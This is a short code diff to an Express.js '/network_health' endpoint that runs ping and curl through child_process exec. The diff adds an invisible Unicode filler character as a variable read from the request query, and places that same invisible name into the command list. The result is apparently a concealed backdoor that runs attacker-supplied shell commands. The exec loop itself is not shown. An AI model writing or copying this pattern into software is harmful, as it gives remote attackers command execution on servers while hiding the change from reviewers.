@@ -5,9 +5,12 @@ const exec = util.promisify(require('child_process').exec);
 const app = express();
 
 app.get('/network_health', async (req, res) => {
+
     const { timeout,ㅤ} = req.query;
+
     const checkCommands = [
         'ping -c 1 google.com',
+
         'curl http://google.com/',ㅤ
     ];
 
